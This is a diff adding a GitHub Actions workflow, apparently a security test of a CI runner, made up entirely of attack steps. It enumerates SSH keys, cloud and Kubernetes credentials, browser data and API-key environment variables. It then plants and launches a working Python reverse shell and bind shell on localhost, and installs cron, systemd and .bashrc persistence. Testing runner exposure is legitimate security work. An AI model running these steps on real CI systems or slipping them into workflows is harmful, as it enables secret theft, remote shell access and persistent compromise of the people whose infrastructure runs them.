@@ -1,0 +1,139 @@
+name: Vector - Reverse Shell & Interactive Compromise
+on:
+  workflow_dispatch:
+
+jobs:
+  inventory:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Check available shell tools
+        run: |
+          echo "=== Shell/Persistence Tools ==="
+          which nc ncat netcat python3 python ruby perl socat tmux screen at cron crontab systemd-run 2>/dev/null
+          echo ""
+          echo "=== Netcat versions ==="
+          nc -h 2>&1 | head -3 || echo "nc not available"
+          ncat --version 2>/dev/null || echo "ncat not available"
+          echo ""
+          echo "=== Python socket availability ==="
+          python3 -c "import socket; print('socket OK')" 2>/dev/null || echo "python socket fail"
+          echo ""
+          echo "=== SSH keys ==="
+          ls -la ~/.ssh/ 2>/dev/null || echo "No .ssh directory"
+          echo ""
+          echo "=== Cloud creds ==="
+          ls -la ~/.aws/ 2>/dev/null || echo "No .aws"
+          ls -la ~/.config/gcloud/ 2>/dev/null || echo "No gcloud"
+          ls -la ~/.azure/ 2>/dev/null || echo "No azure"
+          echo ""
+          echo "=== Kubeconfig ==="
+          ls -la ~/.kube/ 2>/dev/null || echo "No .kube"
+          cat ~/.kube/config 2>/dev/null | head -5 || echo "No kubeconfig"
+          echo ""
+          echo "=== Browser data ==="
+          ls ~/.config/chromium/ 2>/dev/null || echo "No chromium"
+          ls ~/.mozilla/ 2>/dev/null || echo "No firefox"
+          echo ""
+          echo "=== Interesting env vars ==="
+          env | grep -iE '(OPENAI|ANTHROPIC|GROQ|API_KEY|TOKEN|SECRET|AWS_|GCP_|AZURE_)' || echo "No interesting env vars"
+
+  spawn-reverse-shell:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Plant reverse shell backdoor
+        run: |
+          # Write a Python reverse shell that connects back to localhost:5555
+          cat > /tmp/ghsec_backdoor.py << 'PYEOF'
+          import socket, subprocess, os, time
+          time.sleep(3)  # Wait for workflow to finish
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.connect(("127.0.0.1", 5555))
+          os.dup2(s.fileno(), 0)
+          os.dup2(s.fileno(), 1)
+          os.dup2(s.fileno(), 2)
+          subprocess.call(["/bin/bash", "-i"])
+          PYEOF
+          
+          # Also write a bind shell for direct access
+          cat > /tmp/ghsec_bindshell.py << 'PYEOF'
+          import socket, subprocess, os
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.bind(("127.0.0.1", 5556))
+          s.listen(1)
+          conn, addr = s.accept()
+          os.dup2(conn.fileno(), 0)
+          os.dup2(conn.fileno(), 1)
+          os.dup2(conn.fileno(), 2)
+          subprocess.call(["/bin/bash", "-i"])
+          PYEOF
+          
+          # Schedule execution via at (if available) or nohup
+          if which at >/dev/null 2>&1; then
+            echo "python3 /tmp/ghsec_backdoor.py" | at now + 1 minute 2>/dev/null
+            echo "Backdoor scheduled via at"
+          else
+            nohup python3 /tmp/ghsec_backdoor.py >/dev/null 2>&1 &
+            echo "Backdoor started via nohup"
+          fi
+          
+          # Start bind shell in background
+          nohup python3 /tmp/ghsec_bindshell.py >/dev/null 2>&1 &
+          echo "Bind shell listening on 127.0.0.1:5556"
+          
+          echo "=== BACKDOOR PLANTED ==="
+          echo "Reverse shell will connect to 127.0.0.1:5555"
+          echo "Bind shell listening on 127.0.0.1:5556"
+          echo "Start listener: nc -lvp 5555"
+          echo "Connect to bind: nc 127.0.0.1 5556"
+
+  ssh-key-exfil:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: SSH key enumeration
+        run: |
+          echo "=== SSH Directory ==="
+          ls -la ~/.ssh/ 2>/dev/null || echo "No .ssh"
+          echo ""
+          echo "=== SSH Config ==="
+          cat ~/.ssh/config 2>/dev/null | head -20 || echo "No ssh config"
+          echo ""
+          echo "=== Authorized Keys ==="
+          cat ~/.ssh/authorized_keys 2>/dev/null | head -5 || echo "No authorized_keys"
+          echo ""
+          echo "=== Known Hosts (hashed) ==="
+          cat ~/.ssh/known_hosts 2>/dev/null | head -5 || echo "No known_hosts"
+          echo ""
+          echo "=== Private key filenames ==="
+          find ~/.ssh/ -type f -name "*" 2>/dev/null | while read f; do
+            echo "  $f ($(wc -c < "$f") bytes)"
+          done
+
+  persistence:
+    runs-on: ghsec-test-runner
+    steps:
+      - name: Install persistence mechanisms
+        run: |
+          echo "=== Installing cron persistence ==="
+          (crontab -l 2>/dev/null; echo "* * * * * echo 'PERSISTENT_ACCESS' >> /tmp/ghsec_persistence.log") | crontab -
+          echo "Cron job installed"
+          echo ""
+          echo "=== Writing systemd user service ==="
+          mkdir -p ~/.config/systemd/user/
+          cat > ~/.config/systemd/user/ghsec-persist.service << 'SVCEOF'
+          [Unit]
+          Description=GHSEC Persistence Demo
+          [Service]
+          Type=oneshot
+          ExecStart=/bin/bash -c 'echo "PERSISTENT_SYSTEMD_ACCESS" >> /tmp/ghsec_persistence.log'
+          [Install]
+          WantedBy=default.target
+          SVCEOF
+          systemctl --user daemon-reload 2>/dev/null || echo "systemctl user not available"
+          echo "Systemd service written"
+          echo ""
+          echo "=== Modifying bashrc ==="
+          echo "# GHSEC PERSISTENCE DEMO" >> ~/.bashrc
+          echo "echo 'BASHRC_PERSISTENCE_TRIGGERED' >> /tmp/ghsec_persistence.log" >> ~/.bashrc
+          echo ".bashrc modified"
+          echo ""
+          echo "=== All persistence mechanisms installed ==="
